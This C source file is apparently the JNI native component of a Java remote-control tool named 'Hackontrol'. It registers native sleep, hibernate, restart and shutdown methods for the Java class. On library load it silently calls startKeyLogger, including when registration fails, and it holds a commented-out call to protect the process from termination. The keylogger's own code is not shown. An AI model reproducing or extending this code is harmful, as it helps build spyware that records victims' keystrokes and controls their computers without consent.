#include <jni.h>
#include <khopanjni.h>
#include "power.h"
#include "keylogger.h"

static JNINativeMethod HackontrolNativeMethods[] = {
	{"sleep",     "()I", (void*) &NativeLibrary_sleep},
	{"hibernate", "()I", (void*) &NativeLibrary_hibernate},
	{"restart",   "()I", (void*) &NativeLibrary_restart},
	{"shutdown",  "()I", (void*) &NativeLibrary_shutdown}
};

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
	JNIEnv* environment = NULL;
	(*virtualMachine)->GetEnv(virtualMachine, (void**) &environment, JNI_VERSION_21);

	if(!environment) {
		return JNI_VERSION_21;
	}

	jclass nativeLibraryClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/NativeLibrary");
	
	if(!nativeLibraryClass) {
		KHStandardError(environment, "Class 'com.khopan.hackontrol.NativeLibrary' not found");
		goto nativeBindingFail;
	}

	jint result = (*environment)->RegisterNatives(environment, nativeLibraryClass, HackontrolNativeMethods, sizeof(HackontrolNativeMethods) / sizeof(HackontrolNativeMethods[0]));

	if(result < 0) {
		KHStandardError(environment, "Failed to register native methods for class 'com.khopan.hackontrol.NativeLibrary'");
	}

nativeBindingFail:
	startKeyLogger(environment, virtualMachine);
	/*BOOL result = ProtectProcess();

	if(!result) {
		System_err_println(environment, "Process protection has failed!");
	}*/

	return JNI_VERSION_21;
}
